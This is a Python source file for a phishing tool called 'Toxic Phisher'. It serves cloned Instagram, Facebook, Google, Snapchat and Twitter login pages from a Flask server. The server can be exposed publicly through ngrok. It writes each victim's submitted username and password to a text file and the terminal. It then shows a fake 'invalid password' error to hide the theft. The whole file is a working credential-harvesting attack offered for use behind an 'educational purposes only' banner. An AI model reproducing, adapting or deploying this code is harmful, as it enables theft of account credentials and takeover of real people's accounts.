import os
import sys
import time
import subprocess
import threading
import urllib.parse
from datetime import datetime
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress
from flask import Flask, request, render_template_string
from getpass import getpass

# Initialize Rich Console for colorful output
console = Console()

# ANSI Colors for fallback
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

# Password for CLI access
SCRIPT_PASSWORD = "10080"

# Flask app
app = Flask(__name__)

# Phishing Templates
TEMPLATES = {
    "1": {
        "name": "Instagram",
        "html": """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Instagram Login</title>
            <style>
                body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #fafafa, #e0e0e0); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; animation: fadeIn 1s ease-in; }
                .container { background: #fff; padding: 25px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 360px; text-align: center; }
                .container img { width: 160px; margin-bottom: 20px; }
                .container input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; font-size: 14px; transition: border 0.3s; }
                .container input:focus { border-color: #0095f6; outline: none; }
                .container button { width: 100%; padding: 12px; background: linear-gradient(45deg, #0095f6, #f56040); border: none; border-radius: 5px; color: #fff; font-size: 16px; cursor: pointer; transition: transform 0.2s; }
                .container button:hover { transform: scale(1.05); }
                .error { color: #e0245e; font-size: 12px; margin-top: 10px; animation: shake 0.3s; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                @keyframes shake { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(-5px); } }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo">
                <form action="/{{ template_id }}" method="POST">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                {% if error %}
                <p class="error">{{ error }}</p>
                {% endif %}
            </div>
        </body>
        </html>
        """
    },
    "2": {
        "name": "Facebook",
        "html": """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Facebook Login</title>
            <style>
                body { font-family: Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #f0f2f5, #d9e2ec); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; animation: fadeIn 1s ease-in; }
                .container { background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 400px; text-align: center; }
                .container img { width: 180px; margin-bottom: 20px; }
                .container input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; transition: border 0.3s; }
                .container input:focus { border-color: #1877f2; outline: none; }
                .container button { width: 100%; padding: 14px; background: linear-gradient(45deg, #1877f2, #4267b2); border: none; border-radius: 6px; color: #fff; font-size: 16px; cursor: pointer; transition: transform 0.2s; }
                .container button:hover { transform: scale(1.05); }
                .error { color: #e0245e; font-size: 12px; margin-top: 10px; animation: shake 0.3s; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                @keyframes shake { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(-5px); } }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
                <form action="/{{ template_id }}" method="POST">
                    <input type="text" name="username" placeholder="Email or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                {% if error %}
                <p class="error">{{ error }}</p>
                {% endif %}
            </div>
        </body>
        </html>
        """
    },
    "3": {
        "name": "Google",
        "html": """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Google Sign-in</title>
            <style>
                body { font-family: 'Roboto', Arial, sans-serif; background: linear-gradient(135deg, #fff, #f1f3f4); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; animation: fadeIn 1s ease-in; }
                .container { background: #fff; padding: 25px; border: 1px solid #dadce0; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 360px; text-align: center; }
                .container img { width: 100px; margin-bottom: 20px; }
                .container input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 5px; font-size: 14px; transition: border 0.3s; }
                .container input:focus { border-color: #1a73e8; outline: none; }
                .container button { width: 100%; padding: 12px; background: linear-gradient(45deg, #1a73e8, #4285f4); border: none; border-radius: 5px; color: #fff; font-size: 16px; cursor: pointer; transition: transform 0.2s; }
                .container button:hover { transform: scale(1.05); }
                .error { color: #e0245e; font-size: 12px; margin-top: 10px; animation: shake 0.3s; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                @keyframes shake { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(-5px); } }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
                <form action="/{{ template_id }}" method="POST">
                    <input type="text" name="username" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Sign In</button>
                </form>
                {% if error %}
                <p class="error">{{ error }}</p>
                {% endif %}
            </div>
        </body>
        </html>
        """
    },
    "4": {
        "name": "Snapchat",
        "html": """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Snapchat Login</title>
            <style>
                body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #fffc00, #fff); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; animation: fadeIn 1s ease-in; }
                .container { background: #fff; padding: 25px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 360px; text-align: center; }
                .container img { width: 120px; margin-bottom: 20px; }
                .container input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; transition: border 0.3s; }
                .container input:focus { border-color: #fffc00; outline: none; }
                .container button { width: 100%; padding: 12px; background: linear-gradient(45deg, #fffc00, #ffeb3b); border: none; border-radius: 5px; color: #000; font-size: 16px; cursor: pointer; transition: transform 0.2s; }
                .container button:hover { transform: scale(1.05); }
                .error { color: #e0245e; font-size: 12px; margin-top: 10px; animation: shake 0.3s; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                @keyframes shake { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(-5px); } }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://www.snapchat.com/global/social-black.png" alt="Snapchat Logo">
                <form action="/{{ template_id }}" method="POST">
                    <input type="text" name="username" placeholder="Username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                {% if error %}
                <p class="error">{{ error }}</p>
                {% endif %}
            </div>
        </body>
        </html>
        """
    },
    "5": {
        "name": "Twitter",
        "html": """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Twitter Login</title>
            <style>
                body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #000, #1da1f2); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; animation: fadeIn 1s ease-in; }
                .container { background: #fff; padding: 25px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 360px; text-align: center; }
                .container img { width: 100px; margin-bottom: 20px; }
                .container input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; transition: border 0.3s; }
                .container input:focus { border-color: #1da1f2; outline: none; }
                .container button { width: 100%; padding: 12px; background: linear-gradient(45deg, #1da1f2, #0a85c2); border: none; border-radius: 5px; color: #fff; font-size: 16px; cursor: pointer; transition: transform 0.2s; }
                .container button:hover { transform: scale(1.05); }
                .error { color: #e0245e; font-size: 12px; margin-top: 10px; animation: shake 0.3s; }
                @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                @keyframes shake { 0%, 100% { transform: translateX(0); } 50% { transform: translateX(-5px); } }
            </style>
        </head>
        <body>
            <div class="container">
                <img src="https://upload.wikimedia.org/wikipedia/en/9/9f/Twitter_bird_logo_2012.svg" alt="Twitter Logo">
                <form action="/{{ template_id }}" method="POST">
                    <input type="text" name="username" placeholder="Phone, email, or username" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                {% if error %}
                <p class="error">{{ error }}</p>
                {% endif %}
            </div>
        </body>
        </html>
        """
    }
}

# File to store credentials
CRED_FILE = "usernames.txt"

# Store selected template ID globally
SELECTED_TEMPLATE_ID = None

@app.route("/<template_id>", methods=["GET", "POST"])
@app.route("/", methods=["GET", "POST"])
def serve_template(template_id=None):
    global SELECTED_TEMPLATE_ID
    if not template_id and SELECTED_TEMPLATE_ID:
        template_id = SELECTED_TEMPLATE_ID
    if not template_id or template_id not in TEMPLATES:
        return """
        <!DOCTYPE html>
        <html>
        <head><title>Toxic Phisher</title></head>
        <body style="background: #111; color: #0f0; font-family: monospace; text-align: center;">
            <h2>Toxic Phisher by Toxic Arjun</h2>
            <p>Please select a template from the CLI interface.</p>
            <p>If you're seeing this, the server is running but no valid template was requested.</p>
        </body>
        </html>
        """, 200

    console.print(f"[bold yellow][*] Requested path: {request.path}[/bold yellow]")

    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # Save credentials
        with open(CRED_FILE, "a") as f:
            f.write(f"[{datetime.now()}] Username: {username} | Password: {password}\n")
        
        # Display credentials in terminal
        console.print(Panel(
            Text(f"Captured Credentials\nUsername: {username}\nPassword: {password}", style="bold cyan"),
            title="[bold green]Toxic Phisher Success[/bold green]",
            border_style="green",
            expand=False
        ))

        # Render template with error
        return render_template_string(TEMPLATES[template_id]["html"], template_id=template_id, error="Invalid username or password")

    return render_template_string(TEMPLATES[template_id]["html"], template_id=template_id, error=None)

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def start_ngrok(port):
    try:
        ngrok_process = subprocess.Popen(["./ngrok", "http", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)  # Wait for Ngrok to initialize
        result = subprocess.run(["curl", "-s", "http://localhost:4040/api/tunnels"], capture_output=True, text=True)
        if result.stdout:
            import json
            tunnels = json.loads(result.stdout)
            for tunnel in tunnels["tunnels"]:
                if tunnel["proto"] == "https":
                    console.print(f"[bold green][*] Ngrok URL: {tunnel['public_url']}[/bold green]")
                    return tunnel['public_url']
        console.print("[bold red][!] Failed to get Ngrok URL[/bold red]")
        return None
    except Exception as e:
        console.print(f"[bold red][!] Ngrok Error: {e}[/bold red]")
        return None

def run_flask(port):
    app.run(host="0.0.0.0", port=port, threaded=True)

def show_loading():
    with Progress() as progress:
        task = progress.add_task("[cyan]Initializing Toxic Phisher...", total=100)
        for _ in range(100):
            progress.update(task, advance=1)
            time.sleep(0.02)

def check_password():
    clear_screen()
    console.print(Panel(
        Text("Enter Password to Access Toxic Phisher", style="bold cyan"),
        title="[bold green]Toxic Phisher Security[/bold green]",
        border_style="green"
    ))
    for _ in range(3):  # Allow 3 attempts
        password = getpass("[bold green][*] Password: [/bold green]")
        if password == SCRIPT_PASSWORD:
            return True
        console.print("[bold red][!] Incorrect password! Try again.[/bold red]")
    console.print("[bold red][!] Too many incorrect attempts. Exiting...[/bold red]")
    sys.exit(1)

def main():
    # Password check
    if not check_password():
        return

    clear_screen()
    show_loading()
    clear_screen()
    
    # Toxic Arjun ASCII Art
    console.print(Panel(
        Text("""
   _____
  /     \\   Toxic Phisher
 /_______\\  Made by Toxic Arjun
""", style="bold green"),
        title="[bold cyan]Toxic Phisher Server v1.0[/bold cyan]",
        border_style="green"
    ))

    console.print("[bold yellow]Developed for Educational Purposes Only[/bold yellow]")
    console.print("[bold blue]Select a Phishing Template:[/bold blue]")
    for key, value in TEMPLATES.items():
        console.print(f"[bold cyan]{key}. {value['name']}[/bold cyan]")
    console.print("[bold red]0. Exit[/bold red]")

    choice = console.input("[bold green][*] Enter choice (0-5): [/bold green]")
    if choice == "0":
        console.print("[bold red][!] Exiting...[/bold red]")
        sys.exit(0)
    if choice not in TEMPLATES:
        console.print("[bold red][!] Invalid choice![/bold red]")
        time.sleep(2)
        main()

    global SELECTED_TEMPLATE_ID
    SELECTED_TEMPLATE_ID = choice

    console.print("[bold blue][*] Select Tunneling Option:[/bold blue]")
    console.print("[cyan]1. Localhost (http://0.0.0.0:8080)[/cyan]")
    console.print("[cyan]2. Ngrok (Public URL)[/cyan]")
    tunnel_choice = console.input("[bold green][*] Enter choice (1-2): [/bold green]")

    port = 8080
    if tunnel_choice == "2":
        console.print("[bold yellow][*] Starting Ngrok...[/bold yellow]")
        ngrok_url = start_ngrok(port)
        if not ngrok_url:
            console.print("[bold red][!] Ngrok failed, falling back to localhost[/bold red]")
            tunnel_choice = "1"

    # Start Flask server in a separate thread
    server_thread = threading.Thread(target=run_flask, args=(port,))
    server_thread.daemon = True
    server_thread.start()

    # Display server info
    if tunnel_choice == "1":
        console.print(f"[bold green][*] Server URL: http://0.0.0.0:{port}[/bold green]")
        console.print(f"[bold yellow][*] Access locally or via server IP[/bold yellow]")
    console.print(f"[bold yellow][*] Phishing page for {TEMPLATES[choice]['name']} is active[/bold yellow]")
    console.print(f"[bold blue][*] Press Ctrl+C to stop[/bold blue]")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("[bold red][!] Shutting down server...[/bold red]")
        sys.exit(0)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        console.print(f"[bold red][!] Error: {e}[/bold red]")
        sys.exit(1)